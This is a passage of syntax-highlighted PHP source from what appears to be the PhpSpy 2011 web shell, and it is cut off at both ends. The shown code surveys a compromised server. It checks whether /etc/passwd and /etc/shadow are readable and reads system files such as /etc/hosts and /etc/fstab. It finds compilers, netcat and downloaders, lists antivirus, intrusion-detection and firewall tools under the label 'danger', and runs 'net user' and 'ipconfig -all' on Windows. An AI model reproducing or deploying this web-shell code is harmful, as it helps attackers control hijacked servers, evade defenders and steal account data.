<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Disabled PHP Functions'</span>, ($<span style="color: #81a2be;">GLOBALS</span>[<span style="color: #8abeb7;">'disable_functions'</span>])?$<span style="color: #81a2be;">GLOBALS</span>[<span style="color: #8abeb7; text-decoration: underline;">'disable_functions'</span><span style="text-decoration: underline;">]:</span><span style="color: #8abeb7; text-decoration: underline;">'none'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Open base dir'</span>, @<span style="color: #c5c8c6; background-color: #1d1f21;">ini_get(</span><span style="color: #8abeb7;">'open_basedir'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Safe mode exec dir'</span>, @<span style="color: #c5c8c6; background-color: #1d1f21;">ini_get(</span><span style="color: #8abeb7;">'safe_mode_exec_dir'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Safe mode include dir'</span>, @<span style="color: #c5c8c6; background-color: #1d1f21;">ini_get(</span><span style="color: #8abeb7;">'safe_mode_include_dir'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'cURL support'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'curl_version'</span>)?<span style="color: #8abeb7;">'enabled'</span>:<span style="color: #8abeb7;">'no'</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">temp</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'mysql_get_client_info'</span>))
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">temp</span>[] = <span style="color: #8abeb7;">"MySql ("</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_get_client_info(</span>).<span style="color: #8abeb7;">")"</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'mssql_connect'</span>))
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">temp</span>[] = <span style="color: #8abeb7;">"MSSQL"</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'pg_connect'</span>))
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">temp</span>[] = <span style="color: #8abeb7;">"PostgreSQL"</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">function_exists(</span><span style="color: #8abeb7;">'oci_connect'</span>))
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">temp</span>[] = <span style="color: #8abeb7;">"Oracle"</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Supported databases'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">implode(</span><span style="color: #8abeb7;">', '</span>, $<span style="color: #f0c674;">temp</span>));

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>( !<span style="color: #cc6666; font-weight: bold;">IS_WIN</span> ) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">userful</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'gcc'</span>,<span style="color: #8abeb7;">'lcc'</span>,<span style="color: #8abeb7;">'cc'</span>,<span style="color: #8abeb7;">'ld'</span>,<span style="color: #8abeb7;">'make'</span>,<span style="color: #8abeb7;">'php'</span>,<span style="color: #8abeb7;">'perl'</span>,<span style="color: #8abeb7;">'python'</span>,<span style="color: #8abeb7;">'rub</span><span style="color: #8abeb7; text-decoration: underline;">y'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'tar'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'gzip'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'bzip'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'bzip2'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'nc'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'locate'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'suidperl'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">danger</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'kav'</span>,<span style="color: #8abeb7;">'nod32'</span>,<span style="color: #8abeb7;">'bdcored'</span>,<span style="color: #8abeb7;">'uvscan'</span>,<span style="color: #8abeb7;">'sav'</span>,<span style="color: #8abeb7;">'drwebd'</span>,<span style="color: #8abeb7;">'clamd'</span>,<span style="color: #8abeb7; text-decoration: underline;">'rkhunter'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'chkrootkit'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'iptables'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'ipfw'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'tripwire'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'shieldcc'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'portsentry'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'snort'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'ossec'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'lidsadm'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'tcplodg'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'sxid'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'logcheck'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'logwatch'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'sysmask'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'zmbscap'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'sawmill'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'wormscan'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'ninja'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">downloaders</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'wget'</span>,<span style="color: #8abeb7;">'fetch'</span>,<span style="color: #8abeb7;">'lynx'</span>,<span style="color: #8abeb7;">'links'</span>,<span style="color: #8abeb7;">'curl'</span>,<span style="color: #8abeb7;">'get'</span>,<span style="color: #8abeb7;">'lwp-mir</span><span style="color: #8abeb7; text-decoration: underline;">ror'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Readable /etc/passwd'</span>, @<span style="color: #c5c8c6; background-color: #1d1f21;">is_readable(</span><span style="color: #8abeb7;">'/etc/passwd'</span>) ? <span style="color: #8abeb7;">"yes"</span> : <span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Readable /etc/shadow'</span>, @<span style="color: #c5c8c6; background-color: #1d1f21;">is_readable(</span><span style="color: #8abeb7;">'/etc/shadow'</span>) ? <span style="color: #8abeb7;">"yes"</span> : <span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'OS version'</span>, @<span style="color: #c5c8c6; background-color: #1d1f21;">file_get_contents(</span><span style="color: #8abeb7;">'/proc/version'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Distr name'</span>, @<span style="color: #c5c8c6; background-color: #1d1f21;">file_get_contents(</span><span style="color: #8abeb7;">'/etc/issue.net'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">safe_mode</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">ini_get(</span><span style="color: #8abeb7;">'safe_mode'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(!$<span style="color: #81a2be;">GLOBALS</span>[<span style="color: #8abeb7;">'safe_mode'</span>]) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">temp</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">userful</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">item</span>)
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">which(</span>$<span style="color: #f0c674;">item</span>)){$<span style="color: #f0c674;">temp</span>[]=$<span style="color: #f0c674;">item</span>;}
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Userful'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">implode(</span><span style="color: #8abeb7;">', '</span>,$<span style="color: #f0c674;">temp</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">temp</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">danger</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">item</span>)
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">which(</span>$<span style="color: #f0c674;">item</span>)){$<span style="color: #f0c674;">temp</span>[]=$<span style="color: #f0c674;">item</span>;}
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Danger'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">implode(</span><span style="color: #8abeb7;">', '</span>,$<span style="color: #f0c674;">temp</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">temp</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> ($<span style="color: #f0c674;">downloaders</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">item</span>)<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">which(</span>$<span style="color: #f0c674;">item</span>)){$<span style="color: #f0c674;">temp</span>[]=$<span style="color: #f0c674;">item</span>;}
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Downloaders'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">implode(</span><span style="color: #8abeb7;">', '</span>,$<span style="color: #f0c674;">temp</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Hosts'</span>, @<span style="color: #c5c8c6; background-color: #1d1f21;">file_get_contents(</span><span style="color: #8abeb7;">'/etc/hosts'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'HDD space'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">execute(</span><span style="color: #8abeb7;">'df -h'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Mount options'</span>, @<span style="color: #c5c8c6; background-color: #1d1f21;">file_get_contents(</span><span style="color: #8abeb7;">'/etc/fstab'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'OS Version'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">execute(</span><span style="color: #8abeb7;">'ver'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Account Settings'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">execute(</span><span style="color: #8abeb7;">'net accounts'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'User Accounts'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">execute(</span><span style="color: #8abeb7;">'net user'</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'IP Configurate'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">execute(</span><span style="color: #8abeb7;">'ipconfig -all'</span>));
<span style="background-color: #373b41;"> </span>   }
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end</span>

<span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span><span style="color: #8abeb7;">'Undefined Action'</span>);
}

<span style="color: #b294bb;">?&gt;</span>
<span style="color: #81a2be;">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span>
<span style="color: #81a2be;">&lt;div</span> <span style="color: #81a2be;">style=</span><span style="color: #8abeb7;">"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;</span><span style="color: #8abeb7; text-decoration: underline;">background:#eee;"</span><span style="color: #81a2be; text-decoration: underline;">&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">&lt;span</span> <span style="color: #81a2be;">style=</span><span style="color: #8abeb7;">"float:right;"</span><span style="color: #81a2be;">&gt;</span><span style="color: #b294bb;">&lt;?php</span> <span style="color: #c5c8c6; background-color: #1d1f21;">debuginfo(</span>);<span style="color: #c5c8c6; background-color: #1d1f21;">ob_end_flush(</span>);<span style="color: #b294bb;">?&gt;</span><span style="color: #81a2be;">&lt;/span&gt;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #cc6666; font-weight: bold;">Powered</span> <span style="color: #cc6666; font-weight: bold;">by</span> <span style="color: #81a2be;">&lt;a</span> <span style="color: #81a2be;">title=</span><span style="color: #8abeb7;">"Build 20110502"</span> <span style="color: #81a2be;">href=</span><span style="color: #8abeb7;">"http://www.4ngel.net"</span> <span style="color: #81a2be;">target=</span><span style="color: #8abeb7;">"_bl</span><span style="color: #8abeb7; text-decoration: underline;">ank"</span><span style="color: #81a2be; text-decoration: underline;">&gt;</span><span style="color: #b294bb; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #b5bd68; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">str_replace(</span><span style="color: #8abeb7; text-decoration: underline;">'.'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'P.h.p.S.p.y'</span><span style="text-decoration: underline;">);</span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">2011</span><span style="color: #81a2be; text-decoration: underline;">&lt;/a&gt;</span><span style="text-decoration: underline;">. </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">Copyright (</span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">C</span><span style="text-decoration: underline;">) </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">2004</span><span style="text-decoration: underline;">-</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">2011</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">&lt;a</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">href=</span><span style="color: #8abeb7; text-decoration: underline;">"http://www.4ngel.net"</span><span style="text-decoration: underline;"> </span><span style="color: #81a2be; text-decoration: underline;">target=</span><span style="color: #8abeb7; text-decoration: underline;">"_blank"</span><span style="color: #81a2be; text-decoration: underline;">&gt;</span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">Security</span><span style="text-decoration: underline;"> </span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">Angel</span><span style="text-decoration: underline;"> </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">Team [</span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">S4T</span><span style="text-decoration: underline;">]</span><span style="color: #81a2be; text-decoration: underline;">&lt;/a&gt;</span><span style="text-decoration: underline;"> </span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">All</span><span style="text-decoration: underline;"> </span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">Rights</span><span style="text-decoration: underline;"> </span><span style="color: #cc6666; font-weight: bold; text-decoration: underline;">Reserved</span><span style="text-decoration: underline;">.</span>
<span style="color: #81a2be;">&lt;/div&gt;</span>
<span style="color: #81a2be;">&lt;/body&gt;</span>
<span style="color: #81a2be;">&lt;/html&gt;</span>

<span style="color: #b294bb;">&lt;?php</span>

<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">======================================================</span>
<span style="color: #969896; font-style: italic;">&#20989;&#25968;&#24211;</span>
<span style="color: #969896; font-style: italic;">======================================================*/</span>

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">secparam</span>($<span style="color: #f0c674;">n</span>, $<span style="color: #f0c674;">v</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">v</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">trim(</span>$<span style="color: #f0c674;">v</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">v</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;'</span>.$<span style="color: #f0c674;">n</span>.<span style="color: #8abeb7;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;div class="infolist"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">strpos(</span>$<span style="color: #f0c674;">v</span>, <span style="color: #8abeb7;">"\n"</span>) === <span style="color: #81a2be;">false</span>)
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span>$<span style="color: #f0c674;">v</span>.<span style="color: #8abeb7;">'&lt;br /&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">else</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;pre&gt;'</span>.$<span style="color: #f0c674;">v</span>.<span style="color: #8abeb7;">'&lt;/pre&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/div&gt;'</span>);
<span style="background-color: #373b41;"> </span>   }
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">m</span>($<span style="color: #f0c674;">msg</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">'&lt;div style="margin:10px auto 15px auto;background:#ffffe0;border:1px s</span><span style="color: #8abeb7; text-decoration: underline;">olid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;"&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> $<span style="color: #f0c674;">msg</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">'&lt;/div&gt;'</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">scookie</span>($<span style="color: #f0c674;">key</span>, $<span style="color: #f0c674;">value</span>, $<span style="color: #f0c674;">life</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>, $<span style="color: #f0c674;">prefix</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">timestamp</span>, $<span style="color: #81a2be;">_SERVER</span>, $<span style="color: #f0c674;">cookiepre</span>, $<span style="color: #f0c674;">cookiedomain</span>, $<span style="color: #f0c674;">cookiepath</span>, $<span style="color: #f0c674;">cookie</span><span style="color: #f0c674; text-decoration: underline;">life</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">key</span> = ($<span style="color: #f0c674;">prefix</span> ? $<span style="color: #f0c674;">cookiepre</span> : <span style="color: #8abeb7;">''</span>).$<span style="color: #f0c674;">key</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">life</span> = $<span style="color: #f0c674;">life</span> ? $<span style="color: #f0c674;">life</span> : $<span style="color: #f0c674;">cookielife</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">useport</span> = $<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_PORT'</span>] == <span style="color: #c5c8c6; background-color: #1d1f21;">443</span> ? <span style="color: #c5c8c6; background-color: #1d1f21;">1</span> : <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">setcookie(</span>$<span style="color: #f0c674;">key</span>, $<span style="color: #f0c674;">value</span>, $<span style="color: #f0c674;">timestamp</span>+$<span style="color: #f0c674;">life</span>, $<span style="color: #f0c674;">cookiepath</span>, $<span style="color: #f0c674;">cookiedomain</span>, $<span style="color: #f0c674;">usepo</span><span style="color: #f0c674; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
}<span style="color: #cc6666; background-color: #373b41;">   </span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">multi</span>($<span style="color: #f0c674;">num</span>, $<span style="color: #f0c674;">perpage</span>, $<span style="color: #f0c674;">curpage</span>, $<span style="color: #f0c674;">tablename</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">multipage</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">num</span> &gt; $<span style="color: #f0c674;">perpage</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">page</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">10</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">offset</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">5</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">pages</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">ceil(</span>$<span style="color: #f0c674;">num</span> / $<span style="color: #f0c674;">perpage</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">page</span> &gt; $<span style="color: #f0c674;">pages</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">from</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">to</span> = $<span style="color: #f0c674;">pages</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">from</span> = $<span style="color: #f0c674;">curpage</span> - $<span style="color: #f0c674;">offset</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">to</span> = $<span style="color: #f0c674;">curpage</span> + $<span style="color: #f0c674;">page</span> - $<span style="color: #f0c674;">offset</span> - <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">from</span> &lt; <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">to</span> = $<span style="color: #f0c674;">curpage</span> + <span style="color: #c5c8c6; background-color: #1d1f21;">1</span> - $<span style="color: #f0c674;">from</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">from</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(($<span style="color: #f0c674;">to</span> - $<span style="color: #f0c674;">from</span>) &lt; $<span style="color: #f0c674;">page</span> &amp;&amp; ($<span style="color: #f0c674;">to</span> - $<span style="color: #f0c674;">from</span>) &lt; $<span style="color: #f0c674;">pages</span>) {
